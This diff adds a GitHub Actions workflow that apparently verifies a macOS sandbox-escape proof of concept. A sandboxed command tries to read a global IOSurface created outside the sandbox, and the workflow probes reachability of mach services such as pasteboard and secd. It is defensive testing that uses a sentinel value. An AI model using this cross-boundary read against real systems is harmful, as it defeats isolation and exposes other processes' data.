@@ -1,0 +1,88 @@
+name: verify-macos-iosurface-poc
+
+on:
+  workflow_dispatch: {}
+
+jobs:
+  poc:
+    runs-on: macos-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+
+      - name: Build srt
+        run: npm ci && npm run build
+
+      - name: Compile probes
+        run: |
+          set -euxo pipefail
+          cd poc/macos-ipc
+          clang -fobjc-arc -O2 -o iosurface_probe iosurface_probe.m \
+            -framework Foundation -framework IOSurface
+          clang -O2 -o mach_reach mach_reach.m
+          ls -l iosurface_probe mach_reach
+
+      - name: Write srt config (deny network, allow write only to ./out)
+        run: |
+          mkdir -p out
+          cat > s.json <<'EOF'
+          {"filesystem":{"denyRead":[],"allowWrite":["./out"],"denyWrite":[]},
+           "network":{"allowedDomains":[],"deniedDomains":[]}}
+          EOF
+          cat s.json
+
+      - name: Start host global IOSurface OUTSIDE the sandbox
+        run: |
+          set -x
+          SENT="SENTINEL_HOST_IOSURFACE_$RANDOM$RANDOM"
+          echo "$SENT" > sentinel.txt
+          # hold the surface for 120s in the background (simulates a host app /
+          # browser keeping a global compositor surface alive)
+          ./poc/macos-ipc/iosurface_probe host "$SENT" 120 surface_id.txt &
+          echo "HOST_PID=$!"
+          # wait for the id file
+          for i in $(seq 1 50); do [ -s surface_id.txt ] && break; sleep 0.1; done
+          echo "SURFACE_ID=$(cat surface_id.txt)"
+          echo "SENTINEL=$SENT"
+
+      - name: Confirm sandbox is ACTIVE (controls) + attempt cross-boundary IOSurface read
+        run: |
+          set -x
+          ID=$(cat surface_id.txt)
+          SENT=$(cat sentinel.txt)
+          node dist/cli.js -s s.json -- bash -c '
+            set -x
+            echo "--- CONTROL: namespace/active checks ---"
+            # control 1: network egress must be blocked
+            if curl -sS --max-time 5 https://example.com -o /dev/null; then
+              echo "CONTROL network: REACHED (sandbox NOT active) "
+            else
+              echo "CONTROL network: blocked (expected)"
+            fi
+            # control 2: write outside allowWrite must be denied
+            if echo x > /tmp/srt_control_$$ 2>/dev/null && [ -f /tmp/srt_control_$$ ]; then
+              echo "CONTROL write-outside: WROTE (sandbox NOT active)"; rm -f /tmp/srt_control_$$
+            else
+              echo "CONTROL write-outside: denied (expected)"
+            fi
+            echo "--- mach-service reachability from inside the sandbox ---"
+            ./poc/macos-ipc/mach_reach \
+              com.apple.pasteboard.1 \
+              com.apple.windowserver.active \
+              com.apple.logd \
+              com.apple.system.notification_center \
+              com.apple.secd \
+              com.apple.SecurityServer
+            echo "--- cross-boundary IOSurface read ---"
+            ./poc/macos-ipc/iosurface_probe read '"$ID"' '"$SENT"'
+          '
+
+      - name: Summary
+        if: always()
+        run: |
+          echo "=== see the step above: RESULT: READABLE means a sandboxed"
+          echo "=== srt command mapped a global IOSurface created by another"
+          echo "=== host process and read its bytes across the boundary."
